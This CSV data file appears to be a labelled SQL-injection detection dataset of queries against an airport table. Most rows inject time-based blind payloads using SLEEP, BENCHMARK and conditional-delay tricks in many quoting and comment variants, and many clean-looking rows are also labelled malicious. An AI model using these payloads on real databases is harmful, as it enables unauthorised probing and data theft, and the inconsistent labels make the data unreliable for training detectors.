full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (('dEnc' LIKE 'dEnc""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ((('xUmQ' LIKE 'xUmQ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport%';(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND 'NCka%'='NCka""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND 'lDra' LIKE 'lDra""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"");(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (""zJGu""=""zJGu""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ((""jpeO""=""jpeO""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (((""CImW""=""CImW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ""qIow""=""qIow""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"");(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (""yjrm"" LIKE ""yjrm""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ((""xNqr"" LIKE ""xNqr""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (((""ZgWA"" LIKE ""ZgWA""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ""DbLZ"" LIKE ""DbLZ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';(SELECT * FROM (SELECT(SLEEP(5)))HfWn) OR 'winx'='oaEj""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AS gwVK WHERE 5487=5487;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- Wykj""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AS orGp WHERE 6800=6800;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- JZAN""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AS roFs WHERE 9342=9342;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- BUOu""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AS hOkM WHERE 7661=7661;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- gQzY""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""=""BucksAirport"";(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ""BucksAirport""=""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport);(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- IkdW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport);(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (1850=1850""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND ((9332=9332""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)));(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND (((8603=8603""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- zmQk""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)# qQPc""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AS DxSK WHERE 6470=6470;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- Kbib""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AS fMUO WHERE 2708=2708;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- YczJ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport` WHERE 9344=9344;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- ILRI""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`) WHERE 1981=1981;(SELECT * FROM (SELECT(SLEEP(5)))HfWn)-- QjYZ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`=`BucksAirport`;(SELECT * FROM (SELECT(SLEEP(5)))HfWn) AND `BucksAirport`=`BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport]-(SELECT 0 WHERE 6501=6501;(SELECT * FROM (SELECT(SLEEP(5)))HfWn))|[BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport LauB,;(SELECT * FROM (SELECT(SLEEP(5)))HfWn) RxEE""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport');SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'));SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')));SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport%';SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"");SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""));SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")));SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AS xJPR WHERE 7908=7908;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AS XQQZ WHERE 5615=5615;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AS hfQT WHERE 2153=2153;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AS BqMO WHERE 2517=2517;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""=""BucksAirport"";SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' IN BOOLEAN MODE);SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport);SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport));SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)));SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AS nvBW WHERE 6313=6313;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AS DbHH WHERE 2253=2253;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport` WHERE 5456=5456;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`) WHERE 2442=2442;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`=`BucksAirport`;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport]-(SELECT 0 WHERE 3193=3193;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport avSs,;SELECT BENCHMARK(5000000,MD5(0x43574659))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport');SELECT BENCHMARK(5000000,MD5(0x67527275))-- zhhS""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';SELECT BENCHMARK(5000000,MD5(0x67527275))-- UVJf""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT BENCHMARK(5000000,MD5(0x67527275))-- jsRD""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport');SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ('OcZd'='OcZd""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (('RVns'='RVns""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ((('ESXG'='ESXG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';SELECT BENCHMARK(5000000,MD5(0x67527275)) AND 'hGHp'='hGHp""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport');SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ('FVqc' LIKE 'FVqc""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (('wuFV' LIKE 'wuFV""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ((('FflF' LIKE 'FflF""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport%';SELECT BENCHMARK(5000000,MD5(0x67527275)) AND 'NQsN%'='NQsN""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';SELECT BENCHMARK(5000000,MD5(0x67527275)) AND 'HUBP' LIKE 'HUBP""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"");SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (""ocfy""=""ocfy""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ((""aIzJ""=""aIzJ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (((""voaG""=""voaG""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ""SyyM""=""SyyM""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"");SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (""btbA"" LIKE ""btbA""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ((""nian"" LIKE ""nian""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (((""xFxP"" LIKE ""xFxP""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ""kBlW"" LIKE ""kBlW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport';SELECT BENCHMARK(5000000,MD5(0x67527275)) OR 'dnLJ'='PHAi""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AS hpJm WHERE 1113=1113;SELECT BENCHMARK(5000000,MD5(0x67527275))-- usPa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AS oSpk WHERE 5194=5194;SELECT BENCHMARK(5000000,MD5(0x67527275))-- RmhD""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AS ilHj WHERE 6714=6714;SELECT BENCHMARK(5000000,MD5(0x67527275))-- XWln""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AS XhgW WHERE 5293=5293;SELECT BENCHMARK(5000000,MD5(0x67527275))-- qQkr""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""=""BucksAirport"";SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ""BucksAirport""=""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' IN BOOLEAN MODE);SELECT BENCHMARK(5000000,MD5(0x67527275))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport);SELECT BENCHMARK(5000000,MD5(0x67527275))-- KFaD""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport);SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (7095=7095""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND ((3626=3626""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)));SELECT BENCHMARK(5000000,MD5(0x67527275)) AND (((8807=8807""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;SELECT BENCHMARK(5000000,MD5(0x67527275))""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;SELECT BENCHMARK(5000000,MD5(0x67527275))-- jRYH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport;SELECT BENCHMARK(5000000,MD5(0x67527275))# ynvA""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AS LwPu WHERE 5120=5120;SELECT BENCHMARK(5000000,MD5(0x67527275))-- KzrR""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AS PTEB WHERE 8162=8162;SELECT BENCHMARK(5000000,MD5(0x67527275))-- yYus""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport` WHERE 4087=4087;SELECT BENCHMARK(5000000,MD5(0x67527275))-- hrwl""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`) WHERE 6662=6662;SELECT BENCHMARK(5000000,MD5(0x67527275))-- SzIX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`=`BucksAirport`;SELECT BENCHMARK(5000000,MD5(0x67527275)) AND `BucksAirport`=`BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport]-(SELECT 0 WHERE 9562=9562;SELECT BENCHMARK(5000000,MD5(0x67527275)))|[BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport Mvmx,;SELECT BENCHMARK(5000000,MD5(0x67527275)) UyTo""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport),),,,""'))""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'IFwXmK<'"">atFhOC""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AND (SELECT 5539 FROM (SELECT(SLEEP(5)))UpiO)-- gMka""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' AND (SELECT 5539 FROM (SELECT(SLEEP(5)))UpiO)-- urxT""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 5539 FROM (SELECT(SLEEP(5)))UpiO)-- vyru""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 5539 FROM (SELECT(SLEEP(0)))UpiO)-- vyru""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 5539 FROM (SELECT(SLEEP(5)))UpiO)-- vyru""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 5386 FROM (SELECT(SLEEP(5-(IF(35=35,0,5)))))cfzk)-- apXJ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 9695 FROM (SELECT(SLEEP(5-(IF(35=60,0,5)))))AYzJ)-- dZVf""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 2146 FROM (SELECT(SLEEP(5-(IF(35=86,0,5)))))AvMO)-- fwUE""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 7158 FROM (SELECT(SLEEP(5-(IF(86=60,0,5)))))qHMd)-- jTnD""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 1800 FROM (SELECT(SLEEP(5-(IF(60=60,0,5)))))Ixxr)-- yorJ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 8510 FROM (SELECT(SLEEP(5-(IF(86 60,0,5)))))IITS)-- MwoB""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 8917 FROM (SELECT(SLEEP(5-(IF(18=18,0,5)))))uUfI)-- BXSw""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 1893 FROM (SELECT(SLEEP(5-(IF(18=47,0,5)))))kyPz)-- gnRz""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 6459 FROM (SELECT(SLEEP(5-(IF(18=83,0,5)))))LHNd)-- FVwX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 1358 FROM (SELECT(SLEEP(5-(IF(83=47,0,5)))))vzYS)-- dEjB""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND (SELECT 4838 FROM (SELECT(SLEEP(5-(IF(47=47,0,5)))))OLse)-- LUBR""",1,airport-S3,Unknown,Unknown
